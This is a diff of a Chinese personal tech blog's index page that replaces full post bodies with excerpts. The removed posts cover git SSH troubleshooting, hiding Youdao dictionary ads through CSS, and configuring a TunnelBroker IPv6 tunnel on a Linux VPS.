-<p>如果server端的/etc/passwd中git的账户设置中，git使用的是/usr/bin/git-shell，而不是/bin/sh，也会报这个错误。</p>
-<h4 id="Agent-admitted-failure-to-sign-using-the-key"><a href="#Agent-admitted-failure-to-sign-using-the-key" class="headerlink" title="Agent admitted failure to sign using the key."></a>Agent admitted failure to sign using the key.</h4><p>通过图形界面切换到b用户时，遇到这个问题，在原来到界面中，su b是可以clone的。<br>解決方式 使用 ssh-add 指令将私钥 加进来 （根据个人的密匙命名不同更改 id_rsa）</p>
-<pre><code>ssh-add   ~/.ssh/id_rsa 
-</code></pre><hr>
-
+          CentOS Git 服务器与客户端使用
+          <div class="read-more">
+            <a href="/2016/06/18/CentOS Git 服务器与客户端/" class="read-more-link">阅读更多</a>
+          </div>
         
       
     </div>
@@ -1475,12 +277,14 @@ fatal: The remote end hung up unexpectedly
     <div class="post-content">
       
         
+          
+        
 
         
-          <h3 id="1-广告"><a href="#1-广告" class="headerlink" title="1.广告"></a>1.广告</h3><h4 id="安装目录-对应版本号-resultui-css-default-css"><a href="#安装目录-对应版本号-resultui-css-default-css" class="headerlink" title="安装目录\对应版本号\resultui\css\default.css"></a>安装目录\对应版本号\resultui\css\default.css</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="selector-id">#spread</span> &#123;</div><div class="line">    <span class="attribute">line-height</span>: <span class="number">2.5em</span>;</div><div class="line">    <span class="attribute">margin-bottom</span>: <span class="number">0.83em</span>;</div><div class="line">    <span class="attribute">overflow</span>: hidden;</div><div class="line">    <span class="attribute">zoom</span>: <span class="number">1</span>;</div><div class="line">    <span class="attribute">text-overflow</span>: ellipsis;</div><div class="line">    <span class="attribute">white-space</span>: nowrap;</div><div class="line">    <span class="attribute">_width</span>: <span class="built_in">expression</span>(documentElement.clientWidth-122); <span class="comment">/*in ie6 text-overflow:ellipsis need a specified value,so using expression to fix it*/</span></div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="selector-id">#spread</span> <span class="selector-tag">span</span> &#123;</div><div class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">8px</span>;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="selector-id">#spread</span> <span class="selector-tag">a</span>, <span class="selector-id">#spread</span> <span class="selector-tag">a</span><span class="selector-pseudo">:link</span>, <span class="selector-id">#spread</span> <span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;</div><div class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">5px</span>;</div><div class="line">    <span class="attribute">color</span>: <span class="number">#f49800</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h4 id="界面广告"><a href="#界面广告" class="headerlink" title="界面广告"></a>界面广告</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.ads-wrap</span> &#123;</div><div class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1px</span> <span class="built_in">rgb</span>(255, 255, 255), <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">2px</span> <span class="built_in">rgb</span>(225, 225, 225);</div><div class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</div><div class="line">    <span class="attribute">position</span>: fixed;</div><div class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</div><div class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</div><div class="line">    <span class="attribute">z-index</span>: <span class="number">1000</span>;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="selector-class">.ads</span> &#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">655px</span>;</div><div class="line">    <span class="attribute">z-index</span>: <span class="number">1000</span>;</div><div class="line">    <span class="attribute">text-align</span>: center;</div><div class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</div><div class="line">    <span class="attribute">position</span>: relative;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="selector-class">.ads-content</span> &#123;</div><div class="line">    <span class="attribute">background</span>: transparent;</div><div class="line">    <span class="attribute">z-index</span>: <span class="number">1001</span>;</div><div class="line">    <span class="attribute">overflow</span>: hidden;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="selector-class">.ads-mask</span> &#123;</div><div class="line">    <span class="attribute">background</span>: transparent;</div><div class="line">    <span class="attribute">position</span>: absolute;</div><div class="line">    <span class="attribute">z-index</span>: <span class="number">1002</span>;</div><div class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</div><div class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</div><div class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</div><div class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="selector-class">.icon-close-ads</span> &#123;</div><div class="line">    <span class="attribute">position</span>: absolute;</div><div class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</div><div class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</div><div class="line">    <span class="attribute">z-index</span>: <span class="number">1003</span>;</div><div class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'icon/close-ads-bottom.png'</span>) no-repeat <span class="number">0</span> <span class="number">0</span>;</div><div class="line">    <span class="attribute">width</span>: <span class="number">18px</span>;</div><div class="line">    <span class="attribute">height</span>: <span class="number">0</span>;</div><div class="line">    <span class="attribute">padding-top</span>: <span class="number">18px</span>;</div><div class="line">    <span class="attribute">overflow</span>: hidden;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>在选择器依次增加 display: none; 属性就好了。仅仅是不显示而已。</p>
-
+          有道词典去广告
+          <div class="read-more">
+            <a href="/2016/06/11/有道词典去广告/" class="read-more-link">阅读更多</a>
+          </div>
         
       
     </div>
@@ -1510,39 +314,308 @@ fatal: The remote end hung up unexpectedly
     <div class="post-content">
       
         
+          
+        
 
         
-          <h3 id="1-申请Tunnel-Broke账号"><a href="#1-申请Tunnel-Broke账号" class="headerlink" title="1.申请Tunnel Broke账号"></a>1.申请Tunnel Broke账号</h3><h4 id="账号注册"><a href="#账号注册" class="headerlink" title="账号注册"></a>账号注册</h4><p>账号注册如下图所示，具体流程略过。</p>
-<p><strong><em>图1-1</em></strong><br><img src="http://i.imgur.com/TT2bWgW.png" alt=""></p>
-<hr>
-<h3 id="2-创建IPv6隧道"><a href="#2-创建IPv6隧道" class="headerlink" title="2.创建IPv6隧道"></a>2.创建IPv6隧道</h3><p>创建常规隧道,如图2-1所示</p>
-<p><strong><em>图2-1</em></strong><br><img src="http://i.imgur.com/HkC2gLf.png" alt=""></p>
-<p>填写VPS的IP地址，注意，需要在系统防火墙将icmp协议打开，然后会检测是否已经绑定IPv6隧道，检测通过后可以选择Tunnel服务器。</p>
-<p><strong><em>图2-2</em></strong><br><img src="http://i.imgur.com/SihlUvg.png" alt=""></p>
-<p>阿里云VPS禁用了IPv6模块，以CentOS为例，开启IPv6模块，注释禁用IPv6的配置，在/etc/sysconfig/network中，以及/etc/modprobe.d/disable_ipv6.conf 中所有的配置，然后重启服务器。</p>
-<pre><code>NETWORKING=yes
-HOSTNAME=XXXXXX
-NETWORKING_IPV6=no
-PEERNTP=no
-GATEWAY=115.28.XX.XXX
-</code></pre><p>亚马逊VPS则修改/etc/sysctl.conf，将其中的0改为1然后重启服务器。</p>
-<pre><code>net.ipv6.conf.all.disable_ipv6 = 0
-net.ipv6.conf.default.disable_ipv6 = 0 
-</code></pre><p>选择操作系统类型，如图2-3所示，然后执行对应的命令，以linux为例子，ssh登陆阿里云服务器，以root用户执行网站给出的example configuration配置。</p>
-<pre><code>modprobe ipv6
-ip tunnel add he-ipv6 mode sit remote 74.82.46.6 local 121.42.33.4 ttl 255
-ip link set he-ipv6 up
-ip addr add 2001:470:23:ed::2/64 dev he-ipv6
-ip route add ::/0 dev he-ipv6
-ip -f inet6 addr
-</code></pre><p><strong><em>图2-3</em></strong><br><img src="http://i.imgur.com/yNaoP6O.png" alt=""></p>
-<p>防火墙配置，在iptables上放行协议41，命令如下，这时候可以使用带有IPv6地址的主机ping一下该VPS。</p>
-<pre><code>iptables -A INPUT -p 41 -j ACCEPT
-</code></pre><hr>
-<h3 id="3-删除隧道"><a href="#3-删除隧道" class="headerlink" title="3.删除隧道"></a>3.删除隧道</h3><p>首先在VPS命令上上删除隧道适配器，命令为</p>
-<pre><code>ip tunnel del he-ipv6
-</code></pre><p>删除隧道之后，在tunnelbroker上删除对应隧道，然后可以绑定新的隧道。</p>
+          TunnelBroker绑定Linux VPS
+          <div class="read-more">
+            <a href="/2016/05/28/TunnelBroker绑定Linux VPS/" class="read-more-link">阅读更多</a>
+          </div>
+        
+      
+    </div>
 
+    
+  </article>
+
+    
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          <a class="post-link" href="/2016/05/18/CentOS 6.x whmcs/">CentOS 6.x whmcs</a>
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2016年5月18日
+        </span>
+      </div>
+    </header>
+
+    
+
+    <div class="post-content">
+      
+        
+          
+        
+
+        
+          CentOS搭建whmcs破解版本
+          <div class="read-more">
+            <a href="/2016/05/18/CentOS 6.x whmcs/" class="read-more-link">阅读更多</a>
+          </div>
+        
+      
+    </div>
+
+    
+  </article>
+
+    
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          <a class="post-link" href="/2016/03/15/VirtualBox Linux Shrink/">VirtualBox Linux Shrink</a>
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2016年3月15日
+        </span>
+      </div>
+    </header>
+
+    
+
+    <div class="post-content">
+      
+        
+          
+        
+
+        
+          VirtualBox Linux Shrink
+          <div class="read-more">
+            <a href="/2016/03/15/VirtualBox Linux Shrink/" class="read-more-link">阅读更多</a>
+          </div>
+        
+      
+    </div>
+
+    
+  </article>
+
+    
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          <a class="post-link" href="/2016/01/19/NetGear刷回原生系统/">NetGear刷回固件</a>
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2016年1月19日
+        </span>
+      </div>
+    </header>
+
+    
+
+    <div class="post-content">
+      
+        
+          
+        
+
+        
+          NetGear刷回固件
+          <div class="read-more">
+            <a href="/2016/01/19/NetGear刷回原生系统/" class="read-more-link">阅读更多</a>
+          </div>
+        
+      
+    </div>
+
+    
+  </article>
+
+    
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          <a class="post-link" href="/2016/01/10/中科院邮箱系统iOS设置/">中科院邮箱系统iOS设置</a>
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2016年1月10日
+        </span>
+      </div>
+    </header>
+
+    
+
+    <div class="post-content">
+      
+        
+          
+        
+
+        
+          中科院邮箱系统iOS设置
+          <div class="read-more">
+            <a href="/2016/01/10/中科院邮箱系统iOS设置/" class="read-more-link">阅读更多</a>
+          </div>
+        
+      
+    </div>
+
+    
+  </article>
+
+    
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          <a class="post-link" href="/2015/12/23/Wireshark TCP抓包总结/">Wireshark TCP抓包总结</a>
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2015年12月23日
+        </span>
+      </div>
+    </header>
+
+    
+
+    <div class="post-content">
+      
+        
+          
+        
+
+        
+          Wireshark TCP抓包总结
+          <div class="read-more">
+            <a href="/2015/12/23/Wireshark TCP抓包总结/" class="read-more-link">阅读更多</a>
+          </div>
+        
+      
+    </div>
+
+    
+  </article>
+
+    
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          <a class="post-link" href="/2015/12/01/小米路由器mini 刷 PandoraBox/">小米路由器mini刷PandoraBox</a>
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2015年12月1日
+        </span>
+      </div>
+    </header>
+
+    
+
+    <div class="post-content">
+      
+        
+          
+        
+
+        
+          小米路由器mini刷PandoraBox
+          <div class="read-more">
+            <a href="/2015/12/01/小米路由器mini 刷 PandoraBox/" class="read-more-link">阅读更多</a>
+          </div>
+        
+      
+    </div>
+
+    
+  </article>
+
+    
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          <a class="post-link" href="/2015/11/04/Winows node ppt安装/">Windows下nodeppt安装</a>
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2015年11月4日
+        </span>
+      </div>
+    </header>
+
+    
+
+    <div class="post-content">
+      
+        
+          
+        
+
+        
+          Windows下nodeppt安装
+          <div class="read-more">
+            <a href="/2015/11/04/Winows node ppt安装/" class="read-more-link">阅读更多</a>
+          </div>
+        
+      
+    </div>
+
+    
+  </article>
+
+    
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          <a class="post-link" href="/2015/01/29/hello-world/">Hello World</a>
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2015年1月29日
+        </span>
+      </div>
+    </header>
+
+    
+
+    <div class="post-content">
+      
+        
+
+        
+          Linux Bash 环境变量
+          <div class="read-more">
+            <a href="/2015/01/29/hello-world/" class="read-more-link">阅读更多</a>
+          </div>
         
       
     </div>
@@ -1561,11 +634,6 @@ ip -f inet6 addr
         <span class="prev-text">上一页</span>
       </a>
     
-    
-      <a class="next" href="/page/5/">
-        <span class="next-text">下一页</span>
-        <i class="iconfont icon-right"></i>
-      </a>
     
   </nav>
 
